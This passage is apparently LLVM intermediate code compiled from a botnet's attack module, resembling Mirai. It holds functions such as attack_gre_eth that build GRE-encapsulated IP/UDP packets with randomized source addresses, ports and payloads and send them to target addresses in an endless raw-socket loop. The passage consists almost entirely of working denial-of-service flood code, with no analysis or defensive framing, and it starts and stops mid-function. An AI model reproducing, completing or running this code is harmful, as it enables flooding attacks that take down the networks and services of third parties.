  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %162 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %163 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %162, i32 0, i32 1
  store i16 %161, i16* %163, align 2
  %164 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %165 = bitcast %struct.iphdr* %164 to i8*
  %166 = load i8, i8* %165, align 4
  %167 = and i8 %166, 15
  %168 = or i8 %167, 64
  store i8 %168, i8* %165, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, -16
  %173 = or i8 %172, 5
  store i8 %173, i8* %170, align 4
  %174 = load i8, i8* %12, align 1
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 1
  store i8 %174, i8* %176, align 1
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 28, %178
  %180 = trunc i64 %179 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %13, align 2
  %185 = zext i16 %184 to i32
  %186 = xor i32 %185, -1
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %147
  %197 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

; <label>:200:                                    ; preds = %196, %147
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 17, i8* %202, align 1
  %203 = call i32 @rand_next()
  %204 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load i8, i8* %20, align 1
  %207 = icmp ne i8 %206, 0
  br i1 %207, label %208, label %214

; <label>:208:                                    ; preds = %200
  %209 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 9
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  br label %222

; <label>:214:                                    ; preds = %200
  %215 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  %217 = load i32, i32* %216, align 4
  %218 = sub i32 %217, 1024
  %219 = xor i32 %218, -1
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %222

; <label>:222:                                    ; preds = %214, %208
  %223 = load i16, i16* %16, align 2
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 0
  store i16 %224, i16* %226, align 2
  %227 = load i16, i16* %17, align 2
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = load i32, i32* %18, align 4
  %232 = sext i32 %231 to i64
  %233 = add i64 8, %232
  %234 = trunc i64 %233 to i16
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 2
  store i16 %235, i16* %237, align 2
  br label %238

; <label>:238:                                    ; preds = %222
  %239 = load i32, i32* %9, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %9, align 4
  br label %88

; <label>:241:                                    ; preds = %88
  br label %242

; <label>:242:                                    ; preds = %432, %241
  store i32 0, i32* %9, align 4
  br label %243

; <label>:243:                                    ; preds = %429, %242
  %244 = load i32, i32* %9, align 4
  %245 = load i8, i8* %5, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp slt i32 %244, %246
  br i1 %247, label %248, label %432

; <label>:248:                                    ; preds = %243
  %249 = load i8**, i8*** %11, align 8
  %250 = load i32, i32* %9, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i8*, i8** %249, i64 %251
  %253 = load i8*, i8** %252, align 8
  store i8* %253, i8** %26, align 8
  %254 = load i8*, i8** %26, align 8
  %255 = bitcast i8* %254 to %struct.iphdr*
  store %struct.iphdr* %255, %struct.iphdr** %27, align 8
  %256 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i64 1
  %258 = bitcast %struct.iphdr* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %28, align 8
  %259 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i64 1
  %261 = bitcast %struct.grehdr* %260 to %struct.iphdr*
  store %struct.iphdr* %261, %struct.iphdr** %29, align 8
  %262 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i64 1
  %264 = bitcast %struct.iphdr* %263 to %struct.udphdr*
  store %struct.udphdr* %264, %struct.udphdr** %30, align 8
  %265 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i64 1
  %267 = bitcast %struct.udphdr* %266 to i8*
  store i8* %267, i8** %31, align 8
  %268 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 2
  %273 = load i8, i8* %272, align 4
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %274, 32
  br i1 %275, label %276, label %297

; <label>:276:                                    ; preds = %248
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i32 0, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = call i32 @rand_next()
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = lshr i32 %284, %291
  %293 = add i32 %283, %292
  %294 = call i32 @htonl(i32 %293) #7
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 9
  store i32 %294, i32* %296, align 4
  br label %297

; <label>:297:                                    ; preds = %276, %248
  %298 = load i32, i32* %21, align 4
  %299 = icmp eq i32 %298, -1
  br i1 %299, label %300, label %304

; <label>:300:                                    ; preds = %297
  %301 = call i32 @rand_next()
  %302 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  br label %304

; <label>:304:                                    ; preds = %300, %297
  %305 = load i16, i16* %13, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %323

; <label>:308:                                    ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 3
  store i16 %311, i16* %313, align 4
  %314 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 3
  %316 = load i16, i16* %315, align 4
  %317 = zext i16 %316 to i32
  %318 = sub nsw i32 %317, 1000
  %319 = xor i32 %318, -1
  %320 = trunc i32 %319 to i16
  %321 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 3
  store i16 %320, i16* %322, align 4
  br label %323

; <label>:323:                                    ; preds = %308, %304
  %324 = load i16, i16* %16, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %333

; <label>:327:                                    ; preds = %323
  %328 = call i32 @rand_next()
  %329 = and i32 %328, 65535
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 0
  store i16 %330, i16* %332, align 2
  br label %333

; <label>:333:                                    ; preds = %327, %323
  %334 = load i16, i16* %17, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  br i1 %336, label %337, label %343

; <label>:337:                                    ; preds = %333
  %338 = call i32 @rand_next()
  %339 = and i32 %338, 65535
  %340 = trunc i32 %339 to i16
  %341 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 1
  store i16 %340, i16* %342, align 2
  br label %343

; <label>:343:                                    ; preds = %337, %333
  %344 = load i8, i8* %20, align 1
  %345 = icmp ne i8 %344, 0
  br i1 %345, label %350, label %346

; <label>:346:                                    ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 9
  store i32 %347, i32* %349, align 4
  br label %356

; <label>:350:                                    ; preds = %343
  %351 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 9
  %353 = load i32, i32* %352, align 4
  %354 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 9
  store i32 %353, i32* %355, align 4
  br label %356

; <label>:356:                                    ; preds = %350, %346
  %357 = load i8, i8* %19, align 1
  %358 = icmp ne i8 %357, 0
  br i1 %358, label %359, label %362

; <label>:359:                                    ; preds = %356
  %360 = load i8*, i8** %31, align 8
  %361 = load i32, i32* %18, align 4
  call void @rand_str(i8* %360, i32 %361)
  br label %362

; <label>:362:                                    ; preds = %359, %356
  %363 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 7
  store i16 0, i16* %364, align 2
  %365 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %366 = bitcast %struct.iphdr* %365 to i16*
  %367 = call zeroext i16 @checksum_generic(i16* %366, i32 20)
  %368 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 7
  store i16 %367, i16* %369, align 2
  %370 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 7
  store i16 0, i16* %371, align 2
  %372 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %373 = bitcast %struct.iphdr* %372 to i16*
  %374 = call zeroext i16 @checksum_generic(i16* %373, i32 20)
  %375 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 %374, i16* %376, align 2
  %377 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %380 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %381 = bitcast %struct.udphdr* %380 to i8*
  %382 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %383 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %382, i32 0, i32 2
  %384 = load i16, i16* %383, align 2
  %385 = load i32, i32* %18, align 4
  %386 = sext i32 %385 to i64
  %387 = add i64 8, %386
  %388 = trunc i64 %387 to i32
  %389 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %379, i8* %381, i16 zeroext %384, i32 %388)
  %390 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 3
  store i16 %389, i16* %391, align 2
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i32 0, i32 0
  %397 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %396, i32 0, i32 0
  store i16 2, i16* %397, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 9
  %400 = load i32, i32* %399, align 4
  %401 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i32 0, i32 0
  %406 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %405, i32 0, i32 2
  %407 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %406, i32 0, i32 0
  store i32 %400, i32* %407, align 4
  %408 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 0
  %413 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %412, i32 0, i32 1
  store i16 0, i16* %413, align 2
  %414 = load i32, i32* %10, align 4
  %415 = load i8*, i8** %26, align 8
  %416 = load i32, i32* %18, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 52, %417
  %419 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %420 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %421 = load i32, i32* %9, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = bitcast %struct.sockaddr_in* %424 to %struct.sockaddr*
  store %struct.sockaddr* %425, %struct.sockaddr** %419, align 8
  %426 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %427 = load %struct.sockaddr*, %struct.sockaddr** %426, align 8
  %428 = call i64 @sendto(i32 %414, i8* %415, i64 %418, i32 16384, %struct.sockaddr* %427, i32 16)
  br label %429

; <label>:429:                                    ; preds = %362
  %430 = load i32, i32* %9, align 4
  %431 = add nsw i32 %430, 1
  store i32 %431, i32* %9, align 4
  br label %243

; <label>:432:                                    ; preds = %243
  br label %242

; <label>:433:                                    ; preds = %84, %78
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %472

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %472

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %252, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %255

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = and i8 %127, 15
  %129 = or i8 %128, 64
  store i8 %129, i8* %126, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, -16
  %134 = or i8 %133, 5
  store i8 %134, i8* %131, align 4
  %135 = load i8, i8* %12, align 1
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 1
  store i8 %135, i8* %137, align 1
  %138 = load i32, i32* %18, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 66, %139
  %141 = trunc i64 %140 to i16
  %142 = call zeroext i16 @htons(i16 zeroext %141) #7
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %13, align 2
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %15, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %158

; <label>:154:                                    ; preds = %101
  %155 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 4
  store i16 %155, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %154, %101
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 6
  store i8 47, i8* %160, align 1
  %161 = load i32, i32* %21, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 8
  store i32 %161, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 1
  %169 = load i32, i32* %168, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 9
  store i32 %169, i32* %171, align 4
  %172 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %173 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %174 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %173, i32 0, i32 1
  store i16 %172, i16* %174, align 2
  %175 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %176 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %177 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %176, i32 0, i32 2
  store i16 %175, i16* %177, align 1
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %12, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i32, i32* %18, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 28, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %13, align 2
  %199 = zext i16 %198 to i32
  %200 = xor i32 %199, -1
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
